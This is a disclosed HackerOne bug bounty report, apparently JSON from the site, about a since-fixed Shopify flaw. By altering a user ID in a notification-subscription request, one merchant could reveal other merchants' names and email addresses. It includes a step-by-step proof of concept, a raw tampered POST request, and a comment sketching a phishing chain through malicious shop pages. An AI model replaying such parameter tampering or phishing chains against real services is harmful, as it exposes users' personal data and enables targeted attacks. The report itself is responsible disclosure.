{"id":56936,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NjkzNg==","url":"https://hackerone.com/reports/56936","title":"Notification request disclose private information about other myshopify accounts","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-04-17T14:39:07.291Z","submitted_at":"2015-04-17T14:39:07.291Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dvl","url":"/dvl","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/018/725/3a3dc08312d6eb31394230ac5bfd0cbdd5f4eabd_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-09-24T03:24:56.776Z","bug_reporter_agreed_on_going_public_at":"2015-09-24T03:24:56.054Z","team_member_agreed_on_going_public_at":"2015-09-23T21:04:36.232Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello\r\nAttacker, using notification feature in Admin panel, can successfully disclose\\enumerate Shopify customers and retrieve their user-id, first+last name and email address.  Last part of information is most avluble piece of information, since it can be used to conduct targeted attack on Shopify customers [via email] to infect end-user machines and\\or gain access to Shopify accounts. \r\n##POC\r\n1. Login as Attacker to evilshop.myshopify.com/admin\r\n2. Go to Settings/Notifications/Order notifications\" and create new notification for Stuff member. Choose Yourself\r\n3. Capture request and see new notification created.  \r\n4. In captured request, alter order_subscription%5Border_subscription_type%5D value\r\nin this case Attacker replace his  ID with victim ID\r\n5. Attacker observe  \"evilshop.myshopify.com/admin/Settings/Notifications/Order notifications\"\r\n5.1  In case User ID is not registered\\valid -  another Notification showed in list with Attacker UserID.\r\n5.2  In case User ID is registered\\valid  - in list of Notifications appear new Victim \"Stuff member\" , with First + Last name and email address, as registered in Victim profile in his settings.\r\n\r\n##On screenshot attached:\r\nRama Kama is Attacker and owner of this store, and Victim is owner of totally different store, which ID was spoofed to system.\r\n\r\n#Request example:\r\n\r\nPOST /admin/order_subscriptions HTTP/1.1\r\nAccept: text/html, application/xhtml+xml, application/xml\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-XHR-Referer: https://testrua7.myshopify.com/admin/settings/notifications\r\nX-CSRF-Token: f25hau8h3JWDKUqYJvG2sYPAUMXDsieiueb5dr4GsUU=\r\nReferer: https://testrua7.myshopify.com/admin/settings/notifications\r\nAccept-Language: en-US\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\r\nHost: testrua7.myshopify.com\r\nContent-Length: 258\r\nDNT: 1\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\nCookie: __utma=1.2093583371.1428608245.1429207096.1429250267.13; __utmz=1.1428609079.2.2.utmcsr=cio|utmccn=welcome_online|utmcmd=email|utmcct=log_in_store_btn; _ga=GA1.2.2093583371.1428608245; __mmapiwsid=30D865E4-E464-11E4-91DC-547B559CF7BD:8f1edbf6d83d5ddc80b7a3d442de809495f02f1b; __utmb=1.47.10.1429250656; _gat=1; __utmc=1; _secure_admin_session_id=a5dcb62e34ad0ccde4c785efe915374e; request_method=GET\r\n\r\nutf8=%E2%9C%93\u0026authenticity_token=f25hau8h3JWDKUqYJvG2sYPAUMXDsieiueb5dr4GsUU%3D\u0026order_subscription%5Border_subscription_type%5D=user-7837569\u0026order_subscription%5Blocation_id%5D=\u0026order_subscription%5Baddress%5D=\u0026order_subscription%5Bprovider%5D=\u0026_method=post","bounty_amount":"4000.0","formatted_bounty":"$4,000","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":35228,"file_name":"screen_shopify.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/035/228/c326ea689cbe5bc4e6f98e7e091d54540087a370/screen_shopify.png?response-content-disposition=attachment%3B%20filename%3D%22screen_shopify.png%22%3B%20filename%2A%3DUTF-8%27%27screen_shopify.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2ee4dc0d20c8bdb1b73fc4d70ab0793e51bd3c9d5c3337c024b8194c8964bd4b","file_size":21646,"type":"image/png"}],"allow_singular_disclosure_at":"2015-10-23T21:04:36.385Z","allow_singular_disclosure_after":-188330812.5845694,"singular_disclosure_allowed":true,"vote_count":2,"voters":["michiel","dvl"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":387560,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks @dvl, this is a good one. We're investigating the issue.","automated_response":false,"created_at":"2015-04-22T19:33:23.110Z","updated_at":"2015-04-22T19:33:23.110Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":395882,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Francois\nThanks\nInteresting vector for this attack is - since owner of Shop can freely use JS and XSS on  his\\her webshop page, he can successfully attack owner of other shop:\nPOC:\n1.  Attacker create webshop [similar to Vicitim] and order\\shipping webpage with malicious JS or redirect to exploit kit. Main idea - it should appear on webpage, that present in notification link. \n2.  Attacker use described technique to add Victim account to list and receive message from specific action on Attacker webshop [new order page]\n3. Attacker generate new order, and notification sent to victim from Shopify address with known logo etc.\n4. Since request looks legit (I am pretty sure notifications on new orders is part of workflow for most of webshop owners), Victim click on link.\n5. Malicious payload on Attacker page executes  on client's machine. \n6. Profit.\n","automated_response":false,"created_at":"2015-05-01T07:11:39.721Z","updated_at":"2015-05-01T07:11:39.721Z","actor":{"username":"dvl","cleared":false,"url":"/dvl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/018/725/3a3dc08312d6eb31394230ac5bfd0cbdd5f4eabd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":472991,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey there.\nAnything I can do to help? \n:)","automated_response":false,"created_at":"2015-06-15T17:01:31.581Z","updated_at":"2015-06-15T17:01:31.581Z","actor":{"username":"dvl","cleared":false,"url":"/dvl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/018/725/3a3dc08312d6eb31394230ac5bfd0cbdd5f4eabd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":581920,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any news on this one?","automated_response":false,"created_at":"2015-09-08T20:35:59.159Z","updated_at":"2015-09-08T20:35:59.159Z","actor":{"username":"dvl","cleared":false,"url":"/dvl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/018/725/3a3dc08312d6eb31394230ac5bfd0cbdd5f4eabd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":581952,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No","automated_response":false,"created_at":"2015-09-08T20:52:14.518Z","updated_at":"2015-09-08T20:52:14.518Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":596168,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ok, waiting","automated_response":false,"created_at":"2015-09-23T12:02:41.510Z","updated_at":"2015-09-23T12:02:41.510Z","actor":{"username":"dvl","cleared":false,"url":"/dvl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/018/725/3a3dc08312d6eb31394230ac5bfd0cbdd5f4eabd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":596753,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify. This issue has been resolved.","automated_response":false,"created_at":"2015-09-23T21:04:10.744Z","updated_at":"2015-09-23T21:04:10.744Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"4000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"dvl","url":"/dvl"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":596754,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2015-09-23T21:04:20.111Z","updated_at":"2015-09-23T21:04:20.111Z","actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dvl","url":"/dvl"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":596755,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-09-23T21:04:36.257Z","updated_at":"2015-09-23T21:04:36.257Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":597054,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank You! :)","automated_response":false,"created_at":"2015-09-24T03:24:04.141Z","updated_at":"2015-09-24T03:24:04.141Z","actor":{"username":"dvl","cleared":false,"url":"/dvl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/018/725/3a3dc08312d6eb31394230ac5bfd0cbdd5f4eabd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":597056,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-09-24T03:24:56.611Z","updated_at":"2015-09-24T03:24:56.611Z","actor":{"username":"dvl","cleared":false,"url":"/dvl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/018/725/3a3dc08312d6eb31394230ac5bfd0cbdd5f4eabd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":597057,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-09-24T03:24:56.801Z","updated_at":"2015-09-24T03:24:56.801Z","actor":{"username":"dvl","cleared":false,"url":"/dvl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/018/725/3a3dc08312d6eb31394230ac5bfd0cbdd5f4eabd_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}